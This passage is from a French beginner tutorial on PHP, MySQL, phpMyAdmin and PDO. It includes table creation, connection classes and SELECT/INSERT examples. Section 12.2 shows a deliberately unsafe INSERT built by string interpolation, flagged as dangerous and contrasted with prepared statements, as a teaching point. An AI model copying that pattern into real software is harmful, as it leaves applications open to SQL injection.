                                    <li>disponible (vrai/faux)</li>
                                </ul>
                            </li>
                            <li>Une fonction <code>afficherLivre($livre)</code> qui affiche joliment un livre</li>
                            <li>Une fonction <code>chercherParGenre($livres, $genre)</code> qui trouve tous les livres d'un genre</li>
                            <li>Une fonction <code>livresDisponibles($livres)</code> qui compte les livres disponibles</li>
                        </ol>

                        <p><strong>Données de test :</strong></p>
                        <pre>
                            <code>
                                $bibliotheque = [
                                    [
                                        "titre" => "Le Petit Prince",
                                        "auteur" => "Antoine de Saint-Exupéry", 
                                        "annee" => 1943,
                                        "genre" => "Fiction",
                                        "disponible" => true
                                    ],
                                    [
                                        "titre" => "1984",
                                        "auteur" => "George Orwell",
                                        "annee" => 1949, 
                                        "genre" => "Science-fiction",
                                        "disponible" => false
                                    ]
                                    // Ajoutez d'autres livres...
                                ];
                            </code>
                        </pre>
                        <details>
                            <summary><strong>💡 Voir la solution</strong></summary>
                            <pre>
                                <code>
                                    <?php
                                        function afficherLivre($livre) {
                                            echo "<div style='border: 1px solid #ccc; padding: 10px; margin: 10px 0;'>";
                                            echo "<h4>" . $livre["titre"] . "</h4>";
                                            echo "<p><strong>Auteur :</strong> " . $livre["auteur"] . "</p>";
                                            echo "<p><strong>Année :</strong> " . $livre["annee"] . "</p>";
                                            echo "<p><strong>Genre :</strong> " . $livre["genre"] . "</p>";
                                            echo "<p><strong>Statut :</strong> " . ($livre["disponible"] ? "Disponible" : "Emprunté") . "</p>";
                                            echo "</div>";
                                        }

                                        function chercherParGenre($livres, $genre) {
                                            $resultats = [];
                                            foreach ($livres as $livre) {
                                                if ($livre["genre"] == $genre) {
                                                    $resultats[] = $livre;
                                                }
                                            }
                                            return $resultats;
                                        }

                                        function livresDisponibles($livres) {
                                            $compteur = 0;
                                            foreach ($livres as $livre) {
                                                if ($livre["disponible"]) {
                                                    $compteur++;
                                                }
                                            }
                                            return $compteur;
                                        }

                                        // Données de test
                                        $bibliotheque = [
                                            [
                                                "titre" => "Le Petit Prince",
                                                "auteur" => "Antoine de Saint-Exupéry", 
                                                "annee" => 1943,
                                                "genre" => "Fiction",
                                                "disponible" => true
                                            ],
                                            [
                                                "titre" => "1984",
                                                "auteur" => "George Orwell",
                                                "annee" => 1949, 
                                                "genre" => "Science-fiction",
                                                "disponible" => false
                                            ],
                                            [
                                                "titre" => "Dune",
                                                "auteur" => "Frank Herbert",
                                                "annee" => 1965,
                                                            "genre" => "Science-fiction", 
                                            "disponible" => true
                                        ]
                                        ];

                                        // Test des fonctions
                                        echo "<h3>Tous les livres :</h3>";
                                        foreach ($bibliotheque as $livre) {
                                            afficherLivre($livre);
                                        }

                                        echo "<h3>Livres de science-fiction :</h3>";
                                        $sciFi = chercherParGenre($bibliotheque, "Science-fiction");
                                        foreach ($sciFi as $livre) {
                                            afficherLivre($livre);
                                        }

                                        echo "<h3>Statistiques :</h3>";
                                        echo "<p>Livres disponibles : " . livresDisponibles($bibliotheque) . "/" . count($bibliotheque) . "</p>";
                                    ?>
                                </code>
                            </pre>
                        </details>
                    </section>
                    <div class="explanation-box" style="margin-top: 40px;">
                        <h3>🎉 Félicitations !</h3>
                        <p>Vous avez maintenant découvert trois concepts fondamentaux de PHP :</p>
                        <ul>
                            <li><strong>Les boucles</strong> pour répéter des actions automatiquement</li>
                            <li><strong>Les fonctions</strong> pour organiser et réutiliser votre code</li>
                            <li><strong>Les tableaux</strong> pour stocker et manipuler des collections de données</li>
                        </ul>
                        <p>Ces outils sont la base de la programmation PHP. Avec eux, vous pouvez déjà créer des applications simples mais puissantes !</p>
                        
                        <p><strong>Prochaines étapes suggérées :</strong></p>
                        <ul>
                            <li>Pratiquez avec vos propres exercices</li>
                            <li>Combinez ces concepts dans des projets plus complexes</li>
                            <li>Explorez la programmation orientée objet (POO)</li>
                            <li>Apprenez à interagir avec des bases de données</li>
                        </ul>
                    </div>
                </section>
                <!-- Partie 10: Introduction à MySQL et phpMyAdmin -->
<section class="part10">
    <h2>10. Introduction à MySQL et à phpMyAdmin</h2>
    
    <p>Jusqu'à présent, nos données disparaissaient dès que notre script se terminait. Imaginez un site e-commerce où tous les produits et commandes s'effacent à chaque visite ! C'est là qu'interviennent les <strong>bases de données</strong> : des "coffres-forts numériques" qui conservent nos informations de façon permanente.</p>

    <h3>10.1 Qu'est-ce qu'une base de données ?</h3>
    
    <p>Une <strong>base de données</strong> est comme une bibliothèque géante et super organisée. Au lieu de livres, elle stocke des <strong>données</strong> (informations) dans des <strong>tables</strong> bien structurées.</p>

    <h4>Analogie avec une bibliothèque :</h4>
    <ul>
        <li><strong>Base de données</strong> = La bibliothèque entière</li>
        <li><strong>Tables</strong> = Les étagères thématiques (romans, sciences, histoire...)</li>
        <li><strong>Colonnes</strong> = Les critères d'organisation (titre, auteur, année...)</li>
        <li><strong>Lignes</strong> = Chaque livre individuel</li>
    </ul>

    <h4>Exemple concret : Table "utilisateurs"</h4>
    <div style="background: #f0f0f0; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <table border="1" style="border-collapse: collapse; width: 100%;">
            <tr style="background: #3498db; color: white;">
                <th>id</th><th>nom</th><th>email</th><th>age</th><th>ville</th>
            </tr>
            <tr>
                <td>1</td><td>Dupont</td><td>dupont@email.com</td><td>25</td><td>Paris</td>
            </tr>
            <tr>
                <td>2</td><td>Martin</td><td>martin@email.com</td><td>30</td><td>Lyon</td>
            </tr>
            <tr>
                <td>3</td><td>Bernard</td><td>bernard@email.com</td><td>28</td><td>Marseille</td>
            </tr>
        </table>
    </div>

    <p><strong>Vocabulaire important :</strong></p>
    <ul>
        <li><strong>Ligne (enregistrement)</strong> : Un utilisateur complet</li>
        <li><strong>Colonne (champ)</strong> : Une caractéristique (nom, email...)</li>
        <li><strong>Clé primaire</strong> : Un identifiant unique (ici "id")</li>
    </ul>

    <h3>10.2 Pourquoi MySQL ?</h3>
    
    <p><strong>MySQL</strong> est un <em>Système de Gestion de Base de Données</em> (SGBD). C'est comme le bibliothécaire super efficace qui sait exactement où ranger et retrouver chaque information.</p>

    <h4>Avantages de MySQL :</h4>
    <ul>
        <li>🆓 <strong>Gratuit</strong> et open source</li>
        <li>⚡ <strong>Rapide</strong> même avec beaucoup de données</li>
        <li>🔒 <strong>Sécurisé</strong> avec gestion des droits d'accès</li>
        <li>🌐 <strong>Compatible</strong> avec PHP (duo parfait !)</li>
        <li>📈 <strong>Évolutif</strong> : du petit site au gros e-commerce</li>
    </ul>

    <h4>Différence avec les fichiers :</h4>
    <div style="background: #f0f0f0; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <h5>❌ Stockage en fichiers :</h5>
        <pre><code>utilisateurs.txt :
Jean;jean@email.com;25;Paris
Marie;marie@email.com;30;Lyon</code></pre>
        <p><strong>Problèmes :</strong> Difficile à modifier, pas de recherche rapide, pas de sécurité</p>

        <h5>✅ Stockage en base MySQL :</h5>
        <p><strong>Avantages :</strong> Recherche ultra-rapide, modifications faciles, sécurité, sauvegarde automatique</p>
    </div>

    <h3>10.3 Découverte de phpMyAdmin</h3>
    
    <p><strong>phpMyAdmin</strong> est une interface web gratuite qui nous permet de gérer MySQL facilement, sans taper de commandes compliquées. C'est comme avoir un panneau de contrôle visuel pour notre base de données.</p>

    <h4>Comment accéder à phpMyAdmin :</h4>
    <ol>
        <li><strong>Avec XAMPP/WAMP/MAMP :</strong> Démarrez Apache et MySQL, puis allez sur <code>http://localhost/phpmyadmin</code></li>
        <li><strong>Sur un hébergeur :</strong> Cherchez "phpMyAdmin" dans votre panneau d'administration</li>
        <li><strong>Localement :</strong> Souvent accessible via le menu de votre environnement de développement</li>
    </ol>

    <h4>Interface de phpMyAdmin :</h4>
    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <h5>🏠 Page d'accueil :</h5>
        <ul>
            <li><strong>Colonne de gauche :</strong> Liste des bases de données</li>
            <li><strong>Centre :</strong> Informations et statistiques du serveur</li>
            <li><strong>Onglets du haut :</strong> Bases de données, SQL, Statut, etc.</li>
        </ul>

        <h5>📊 Dans une base de données :</h5>
        <ul>
            <li><strong>Structure :</strong> Voir l'organisation des tables</li>
            <li><strong>SQL :</strong> Exécuter des requêtes personnalisées</li>
            <li><strong>Rechercher :</strong> Trouver des données spécifiques</li>
            <li><strong>Exporter :</strong> Sauvegarder vos données</li>
        </ul>
    </div>

    <h3>10.4 Création de votre première base de données</h3>
    
    <h4>Étape 1 : Créer la base</h4>
    <ol>
        <li>Ouvrez phpMyAdmin</li>
        <li>Cliquez sur <strong>"Nouvelle base de données"</strong></li>
        <li>Nom : <code>ecole_php</code></li>
        <li>Interclassement : <code>utf8_general_ci</code> (pour les accents français)</li>
        <li>Cliquez <strong>"Créer"</strong></li>
    </ol>

    <h4>Étape 2 : Créer votre première table</h4>
    <pre><code>-- Structure de la table "etudiants"
CREATE TABLE etudiants (
    id INT AUTO_INCREMENT PRIMARY KEY,
    nom VARCHAR(50) NOT NULL,
    prenom VARCHAR(50) NOT NULL,
    email VARCHAR(100) UNIQUE,
    age INT,
    ville VARCHAR(50),
    date_inscription DATE
);</code></pre>

    <p><strong>Explication du code :</strong></p>
    <ul>
        <li><code>id INT AUTO_INCREMENT PRIMARY KEY</code> : Numéro unique qui s'incrémente automatiquement</li>
        <li><code>VARCHAR(50)</code> : Texte de maximum 50 caractères</li>
        <li><code>NOT NULL</code> : Ce champ est obligatoire</li>
        <li><code>UNIQUE</code> : Chaque email doit être différent</li>
        <li><code>DATE</code> : Format date (YYYY-MM-DD)</li>
    </ul>

    <h4>Étape 3 : Ajouter des données de test</h4>
    <pre><code>-- Insérer quelques étudiants
INSERT INTO etudiants (nom, prenom, email, age, ville, date_inscription) VALUES
('Dupont', 'Jean', 'jean.dupont@email.com', 22, 'Paris', '2024-01-15'),
('Martin', 'Marie', 'marie.martin@email.com', 24, 'Lyon', '2024-01-16'),
('Bernard', 'Pierre', 'pierre.bernard@email.com', 23, 'Marseille', '2024-01-17');</code></pre>

    <h3>10.5 Types de données essentiels</h3>
    
    <h4>Types numériques :</h4>
    <ul>
        <li><code>INT</code> : Nombres entiers (-2 milliards à +2 milliards)</li>
        <li><code>DECIMAL(10,2)</code> : Nombres décimaux (10 chiffres dont 2 après la virgule)</li>
        <li><code>FLOAT</code> : Nombres décimaux approximatifs</li>
    </ul>

    <h4>Types texte :</h4>
    <ul>
        <li><code>VARCHAR(255)</code> : Texte court variable (jusqu'à 255 caractères)</li>
        <li><code>TEXT</code> : Texte long (articles, descriptions...)</li>
        <li><code>CHAR(10)</code> : Texte de taille fixe (codes postaux, téléphones...)</li>
    </ul>

    <h4>Types date/heure :</h4>
    <ul>
        <li><code>DATE</code> : Date seule (2024-12-25)</li>
        <li><code>TIME</code> : Heure seule (14:30:00)</li>
        <li><code>DATETIME</code> : Date et heure (2024-12-25 14:30:00)</li>
        <li><code>TIMESTAMP</code> : Date/heure avec mise à jour automatique</li>
    </ul>

    <h4>Types spéciaux :</h4>
    <ul>
        <li><code>BOOLEAN</code> : Vrai/Faux (1/0)</li>
        <li><code>ENUM('petit', 'moyen', 'grand')</code> : Choix limité</li>
    </ul>

    <h3>10.6 Bonnes pratiques</h3>
    
    <h4>Nommage :</h4>
    <ul>
        <li><strong>Tables :</strong> Au pluriel et en minuscules (<code>utilisateurs</code>, <code>produits</code>)</li>
        <li><strong>Colonnes :</strong> En minuscules avec underscore (<code>date_creation</code>, <code>prix_unitaire</code>)</li>
        <li><strong>Pas d'accents</strong> ni d'espaces dans les noms</li>
    </ul>

    <h4>Structure :</h4>
    <ul>
        <li>Toujours une <strong>clé primaire</strong> (généralement <code>id</code>)</li>
        <li>Définir les contraintes (<code>NOT NULL</code>, <code>UNIQUE</code>)</li>
        <li>Choisir le bon type de données (pas de VARCHAR pour des nombres !)</li>
    </ul>

    <h3>10.7 Exercice pratique : Créer une base "boutique"</h3>
    
    <p><strong>Objectif :</strong> Créer une base de données pour une petite boutique en ligne.</p>
    
    <p><strong>Créez ces tables :</strong></p>
    
    <h4>1. Table "produits" :</h4>
    <ul>
        <li>id (clé primaire)</li>
        <li>nom (50 caractères, obligatoire)</li>
        <li>description (texte long)</li>
        <li>prix (décimal avec 2 décimales)</li>
        <li>stock (nombre entier)</li>
        <li>categorie (enum: 'electronique', 'vetement', 'livre', 'autre')</li>
        <li>date_ajout (date et heure automatique)</li>
    </ul>

    <h4>2. Table "commandes" :</h4>
    <ul>
        <li>id (clé primaire)</li>
        <li>numero_commande (10 caractères, unique)</li>
        <li>client_nom (50 caractères, obligatoire)</li>
        <li>client_email (100 caractères, obligatoire)</li>
        <li>total (décimal)</li>
        <li>statut (enum: 'en_attente', 'expediee', 'livree')</li>
        <li>date_commande (date et heure automatique)</li>
    </ul>

    <p><strong>Ajoutez quelques données de test dans chaque table.</strong></p>

    <details>
        <summary><strong>💡 Voir la solution</strong></summary>
        <pre><code>-- Création de la base de données
CREATE DATABASE boutique;
USE boutique;

-- Table produits
CREATE TABLE produits (
    id INT AUTO_INCREMENT PRIMARY KEY,
    nom VARCHAR(50) NOT NULL,
    description TEXT,
    prix DECIMAL(10,2) NOT NULL,
    stock INT DEFAULT 0,
    categorie ENUM('electronique', 'vetement', 'livre', 'autre') DEFAULT 'autre',
    date_ajout TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Table commandes
CREATE TABLE commandes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    numero_commande VARCHAR(10) UNIQUE NOT NULL,
    client_nom VARCHAR(50) NOT NULL,
    client_email VARCHAR(100) NOT NULL,
    total DECIMAL(10,2) NOT NULL,
    statut ENUM('en_attente', 'expediee', 'livree') DEFAULT 'en_attente',
    date_commande TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Données de test pour produits
INSERT INTO produits (nom, description, prix, stock, categorie) VALUES
('Smartphone XY', 'Téléphone dernière génération avec caméra 48MP', 599.99, 15, 'electronique'),
('T-shirt bleu', 'T-shirt 100% coton, couleur bleu marine', 19.99, 50, 'vetement'),
('Guide PHP', 'Livre complet pour apprendre PHP et MySQL', 29.99, 25, 'livre'),
('Casque Bluetooth', 'Casque sans fil avec réduction de bruit', 79.99, 8, 'electronique');

-- Données de test pour commandes
INSERT INTO commandes (numero_commande, client_nom, client_email, total, statut) VALUES
('CMD001', 'Jean Dupont', 'jean@email.com', 619.98, 'expediee'),
('CMD002', 'Marie Martin', 'marie@email.com', 49.98, 'en_attente'),
('CMD003', 'Pierre Bernard', 'pierre@email.com', 29.99, 'livree');</code></pre>
    </details>
</section>

<!-- Partie 11: Connexion PHP à MySQL -->
<section class="part11">
    <h2>11. Connexion PHP à MySQL (PDO ou MySQLi)</h2>
    
    <p>Maintenant que nous avons une base de données, il faut que PHP puisse "parler" avec elle ! C'est comme si PHP était un traducteur entre votre site web et la base de données MySQL. En PHP, nous avons deux moyens principaux pour cette connexion : <strong>PDO</strong> et <strong>MySQLi</strong>.</p>

    <h3>11.1 PDO vs MySQLi : Que choisir ?</h3>
    
    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <h4>🏆 PDO (PHP Data Objects) - Recommandé</h4>
        <p><strong>Avantages :</strong></p>
        <ul>
            <li>✅ Compatible avec plusieurs bases de données (MySQL, PostgreSQL, SQLite...)</li>
            <li>✅ Syntaxe cohérente et moderne</li>
            <li>✅ Meilleure sécurité avec les requêtes préparées</li>
            <li>✅ Gestion d'erreurs plus claire</li>
        </ul>

        <h4>⚖️ MySQLi (MySQL Improved)</h4>
        <p><strong>Avantages :</strong></p>
        <ul>
            <li>✅ Légèrement plus rapide pour MySQL</li>
            <li>✅ Syntaxe procédurale et orientée objet</li>
            <li>❌ Fonctionne uniquement avec MySQL</li>
        </ul>
    </div>

    <p><strong>Notre choix :</strong> Nous utiliserons <strong>PDO</strong> car il est plus moderne, plus sécurisé et plus flexible !</p>

    <h3>11.2 Informations de connexion</h3>
    
    <p>Pour se connecter à MySQL, PHP a besoin de 4 informations essentielles :</p>

    <div style="background: #f0f0f0; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <ul>
            <li><strong>Hôte (host) :</strong> Où se trouve le serveur MySQL</li>
            <li><strong>Nom de la base :</strong> Quelle base utiliser</li>
            <li><strong>Utilisateur :</strong> Le "login" pour accéder</li>
            <li><strong>Mot de passe :</strong> Le "password" pour s'identifier</li>
        </ul>
    </div>

    <h4>Valeurs typiques selon l'environnement :</h4>
    <pre><code>// ⚡ Développement local (XAMPP/WAMP/MAMP)
$host = 'localhost';        // ou '127.0.0.1'
$dbname = 'ma_base';       // nom de votre base
$username = 'root';        // utilisateur par défaut
$password = '';            // souvent vide en local

// 🌐 Serveur de production
$host = 'mysql.monhebergeur.com';
$dbname = 'utilisateur_mabase';
$username = 'utilisateur_db';
$password = 'mot_de_passe_complexe';</code></pre>

    <h3>11.3 Première connexion avec PDO</h3>
    
    <h4>Méthode simple :</h4>
    <pre><code><?php
// Informations de connexion
$host = 'localhost';
$dbname = 'ecole_php';  // La base créée précédemment
$username = 'root';
$password = '';

try {
    // Créer la connexion PDO
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $username, $password);
    
    // Configurer PDO pour afficher les erreurs
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    echo "✅ Connexion réussie !";
    
} catch (PDOException $e) {
    echo "❌ Erreur de connexion : " . $e->getMessage();
}
?></code></pre>

    <p><strong>Explication du code :</strong></p>
    <ul>
        <li><code>new PDO()</code> : Crée une nouvelle connexion</li>
        <li><code>"mysql:host=..."</code> : Chaîne de connexion (DSN)</li>
        <li><code>charset=utf8</code> : Pour les caractères français</li>
        <li><code>try/catch</code> : Gestion des erreurs</li>
        <li><code>ATTR_ERRMODE</code> : Affiche les erreurs détaillées</li>
    </ul>

    <h3>11.4 Connexion sécurisée avec fichier de configuration</h3>
    
    <p>Pour la sécurité, il ne faut <strong>jamais</strong> mettre les mots de passe directement dans le code ! Créons un fichier de configuration séparé.</p>

    <h4>Fichier config.php :</h4>
    <pre><code><?php
// config.php - Fichier de configuration
define('DB_HOST', 'localhost');
define('DB_NAME', 'ecole_php');
define('DB_USER', 'root');
define('DB_PASS', '');

// Fonction de connexion réutilisable
function connecterDB() {
    try {
        $dsn = "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8";
        $pdo = new PDO($dsn, DB_USER, DB_PASS);
        
        // Configuration PDO
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        
        return $pdo;
        
    } catch (PDOException $e) {
        die("Erreur de connexion : " . $e->getMessage());
    }
}
?></code></pre>

    <h4>Utilisation dans vos scripts :</h4>
    <pre><code><?php
// Dans n'importe quel fichier PHP
require_once 'config.php';

// Se connecter à la base
$pdo = connecterDB();

echo "✅ Connexion établie !";
?></code></pre>

    <div style="background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <strong>🔒 Conseil sécurité :</strong> Ajoutez <code>config.php</code> dans votre fichier <code>.gitignore</code> pour éviter de publier vos mots de passe sur GitHub !
    </div>

    <h3>11.5 Tester la connexion avec une requête simple</h3>
    
    <pre><code><?php
require_once 'config.php';

try {
    $pdo = connecterDB();
    
    // Test simple : compter les étudiants
    $sql = "SELECT COUNT(*) as nombre_etudiants FROM etudiants";
    $resultat = $pdo->query($sql);
    $ligne = $resultat->fetch();
    
    echo "📊 Nombre d'étudiants dans la base : " . $ligne['nombre_etudiants'];
    
    // Test : récupérer les infos de la base
    $sql = "SELECT DATABASE() as nom_base, VERSION() as version_mysql";
    $resultat = $pdo->query($sql);
    $info = $resultat->fetch();
    
    echo "<br>🗄️ Base actuelle : " . $info['nom_base'];
    echo "<br>🔧 Version MySQL : " . $info['version_mysql'];
    
} catch (PDOException $e) {
    echo "❌ Erreur : " . $e->getMessage();
}
?></code></pre>

    <h3>11.6 Gestion des erreurs et debug</h3>
    
    <h4>Configuration pour le développement :</h4>
    <pre><code><?php
// Mode développement - Affiche toutes les erreurs
function connecterDB_Dev() {
    try {
        $dsn = "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8";
        $pdo = new PDO($dsn, DB_USER, DB_PASS);
        
        // Configuration pour le debug
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        $pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
        
        echo "🔧 Mode développement - Connexion OK<br>";
        return $pdo;
        
    } catch (PDOException $e) {
        echo "<div style='background:#ffebee;padding:10px;border-radius:5px;'>";
        echo "<strong>❌ Erreur de connexion :</strong><br>";
        echo "Code : " . $e->getCode() . "<br>";
        echo "Message : " . $e->getMessage() . "<br>";
        echo "Fichier : " . $e->getFile() . " ligne " . $e->getLine();
        echo "</div>";
        die();
    }
}
?></code></pre>

    <h4>Configuration pour la production :</h4>
    <pre><code><?php
// Mode production - Erreurs discrètes
function connecterDB_Prod() {
    try {
        $dsn = "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8";
        $pdo = new PDO($dsn, DB_USER, DB_PASS);
        
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        
        return $pdo;
        
    } catch (PDOException $e) {
        // Log l'erreur dans un fichier
        error_log("Erreur DB : " . $e->getMessage(), 3, "logs/erreurs.log");
        
        // Message générique pour l'utilisateur
        die("Service temporairement indisponible. Merci de réessayer plus tard.");
    }
}
?></code></pre>

    <h3>11.7 Exercice pratique : Classe de connexion</h3>
    
    <p><strong>Objectif :</strong> Créer une classe réutilisable pour gérer la connexion à la base de données.</p>
    
    <p><strong>Créez une classe <code>Database</code> avec :</strong></p>
    <ol>
        <li>Propriétés privées pour les informations de connexion</li>
        <li>Méthode <code>connect()</code> qui retourne une connexion PDO</li>
        <li>Méthode <code>testConnection()</code> qui vérifie si la connexion fonctionne</li>
        <li>Gestion des erreurs appropriée</li>
    </ol>

    <p><strong>Utilisation souhaitée :</strong></p>
    <pre><code>$db = new Database('localhost', 'ecole_php', 'root', '');
$pdo = $db->connect();
$db->testConnection();</code></pre>

    <details>
        <summary><strong>💡 Voir la solution</strong></summary>
        <pre><code><?php
class Database {
    private $host;
    private $dbname;
    private $username;
    private $password;
    private $pdo;
    
    public function __construct($host, $dbname, $username, $password) {
        $this->host = $host;
        $this->dbname = $dbname;
        $this->username = $username;
        $this->password = $password;
    }
    
    public function connect() {
        if ($this->pdo === null) {
            try {
                $dsn = "mysql:host={$this->host};dbname={$this->dbname};charset=utf8";
                $this->pdo = new PDO($dsn, $this->username, $this->password);
                
                // Configuration PDO
                $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
                
            } catch (PDOException $e) {
                throw new Exception("Erreur de connexion : " . $e->getMessage());
            }
        }
        
        return $this->pdo;
    }
    
    public function testConnection() {
        try {
            $pdo = $this->connect();
            $sql = "SELECT 1";
            $pdo->query($sql);
            echo "✅ Connexion à la base de données réussie !<br>";
            
            // Infos supplémentaires
            $sql = "SELECT DATABASE() as db, VERSION() as version";
            $result = $pdo->query($sql)->fetch();
            echo "📋 Base : {$result['db']}<br>";
            echo "🔧 MySQL version : {$result['version']}<br>";
            
            return true;
            
        } catch (Exception $e) {
            echo "❌ Erreur de connexion : " . $e->getMessage() . "<br>";
            return false;
        }
    }
    
    public function closeConnection() {
        $this->pdo = null;
        echo "🔌 Connexion fermée.<br>";
    }
}

// Utilisation
try {
    $db = new Database('localhost', 'ecole_php', 'root', '');
    $pdo = $db->connect();
    $db->testConnection();
    
    // Votre code avec la base...
    
    $db->closeConnection();
    
} catch (Exception $e) {
    echo "Erreur : " . $e->getMessage();
}
?></code></pre>
    </details>
</section>

<!-- Partie 12: Requêtes SQL -->
<section class="part12">
    <h2>12. Requêtes SQL : SELECT, INSERT, UPDATE, DELETE</h2>
    
    <p>Maintenant que PHP peut parler avec MySQL, apprenons le <strong>langage SQL</strong> ! SQL (Structured Query Language) est le langage universel pour communiquer avec les bases de données. C'est comme apprendre à dire "s'il vous plaît" et "merci" à votre base de données !</p>

    <p>Les 4 opérations essentielles sont :</p>
    <ul>
        <li><strong>SELECT</strong> : Lire/récupérer des données 📖</li>
        <li><strong>INSERT</strong> : Ajouter de nouvelles données ➕</li>
        <li><strong>UPDATE</strong> : Modifier des données existantes ✏️</li>
        <li><strong>DELETE</strong> : Supprimer des données 🗑️</li>
    </ul>

    <h3>12.1 SELECT - Lire les données</h3>
    
    <p><code>SELECT</code> est la requête la plus utilisée. C'est comme demander à la base : <em>"Montre-moi ces informations !"</em></p>

    <h4>Syntaxe de base :</h4>
    <pre><code>SELECT colonnes FROM table WHERE conditions;</code></pre>

    <h4>Exemples simples :</h4>
    <pre><code><?php
require_once 'config.php';
$pdo = connecterDB();

// 1. Récupérer TOUS les étudiants
$sql = "SELECT * FROM etudiants";
$resultat = $pdo->query($sql);

echo "<h4>Tous les étudiants :</h4>";
while ($etudiant = $resultat->fetch()) {
    echo $etudiant['prenom'] . " " . $etudiant['nom'] . " (" . $etudiant['age'] . " ans)<br>";
}

// 2. Récupérer seulement certaines colonnes
$sql = "SELECT nom, prenom, email FROM etudiants";
$resultat = $pdo->query($sql);

echo "<h4>Noms et emails :</h4>";
while ($etudiant = $resultat->fetch()) {
    echo $etudiant['prenom'] . " " . $etudiant['nom'] . " - " . $etudiant['email'] . "<br>";
}
?></code></pre>

    <h4>SELECT avec conditions (WHERE) :</h4>
    <pre><code><?php
// Étudiants de plus de 23 ans
$sql = "SELECT * FROM etudiants WHERE age > 23";
$resultat = $pdo->query($sql);

echo "<h4>Étudiants de plus de 23 ans :</h4>";
while ($etudiant = $resultat->fetch()) {
    echo $etudiant['prenom'] . " " . $etudiant['nom'] . " (" . $etudiant['age'] . " ans)<br>";
}

// Étudiant spécifique par email
$sql = "SELECT * FROM etudiants WHERE email = 'jean.dupont@email.com'";
$resultat = $pdo->query($sql);
$etudiant = $resultat->fetch();

if ($etudiant) {
    echo "<h4>Étudiant trouvé :</h4>";
    echo $etudiant['prenom'] . " " . $etudiant['nom'];
} else {
    echo "Aucun étudiant avec cet email.";
}
?></code></pre>

    <h4>Conditions multiples et tri :</h4>
    <pre><code><?php
// Étudiants de Paris ET de plus de 20 ans, triés par nom
$sql = "SELECT * FROM etudiants 
        WHERE ville = 'Paris' AND age > 20 
        ORDER BY nom ASC";
$resultat = $pdo->query($sql);

// Recherche avec LIKE (recherche partielle)
$sql = "SELECT * FROM etudiants WHERE nom LIKE '%mart%'";
$resultat = $pdo->query($sql);

// Limiter le nombre de résultats
$sql = "SELECT * FROM etudiants ORDER BY age DESC LIMIT 2";
$resultat = $pdo->query($sql);
?></code></pre>

    <h3>12.2 INSERT - Ajouter des données</h3>
    
    <p><code>INSERT</code> permet d'ajouter de nouveaux enregistrements dans la base. C'est comme remplir un nouveau formulaire d'inscription.</p>

    <h4>Syntaxe de base :</h4>
    <pre><code>INSERT INTO table (colonne1, colonne2, ...) VALUES (valeur1, valeur2, ...);</code></pre>

    <h4>Méthode simple (attention aux injections SQL !) :</h4>
    <pre><code><?php
// ⚠️ DANGEREUX - Ne jamais faire comme ça en production !
$nom = "Durand";
$prenom = "Sophie";
$email = "sophie.durand@email.com";

$sql = "INSERT INTO etudiants (nom, prenom, email, age, ville) 
        VALUES ('$nom', '$prenom', '$email', 21, 'Lille')";

try {
    $pdo->exec($sql);
    echo "✅ Étudiant ajouté avec succès !";
} catch (PDOException $e) {
    echo "❌ Erreur : " . $e->getMessage();
}
?></code></pre>

    <h4>Méthode sécurisée avec requêtes préparées :</h4>
    <pre><code><?php
// ✅ SÉCURISÉ - Toujours faire comme ça !
function ajouterEtudiant($pdo, $nom, $prenom, $email, $age, $ville) {
    $sql = "INSERT INTO etudiants (nom, prenom, email, age, ville, date_inscription) 
            VALUES (:nom, :prenom, :email, :age, :ville, NOW())";
    
    try {
        $stmt = $pdo->prepare($sql);
        $stmt->execute([
            ':nom' => $nom,
            ':prenom' => $prenom,
            ':email' => $email,
            ':age' => $age,
            ':ville' => $ville
        ]);
        
        echo "✅ Étudiant ajouté ! ID : " . $pdo->lastInsertId();
        return $pdo->lastInsertId();
        
    } catch (PDOException $e) {
        echo "❌ Erreur : " . $e->getMessage();
        return false;
    }
}

// Utilisation
$pdo = connecterDB();
ajouterEtudiant($pdo, "Moreau", "Julie", "julie.moreau@email.com", 19, "Bordeaux");
?></code></pre>

    <h4>Ajouter plusieurs enregistrements d'un coup :</h4>
    <pre><code><?php
function ajouterPlusieursEtudiants($pdo, $etudiants) {
    $sql = "INSERT INTO etudiants (nom, prenom, email, age, ville) VALUES ";
    $valeurs = [];
    $params = [];
    
    foreach ($etudiants as $i => $etudiant) {
        $valeurs[] = "(:nom$i, :prenom$i, :email$i, :age$i, :ville$i)";
        $params[":nom$i"] = $etudiant['nom'];
        $params[":prenom$i"] = $etudiant['prenom'];
        $params[":email$i"] = $etudiant['email'];
        $params[":age$i"] = $etudiant['age'];
        $params[":ville$i"] = $etudiant['ville'];
    }
    
    $sql .= implode(', ', $valeurs);
    
    try {
        $stmt = $pdo->prepare($sql);
        $stmt->execute($params);
        echo "✅ " . count($etudiants) . " étudiants ajoutés !";
    } catch (PDOException $e) {
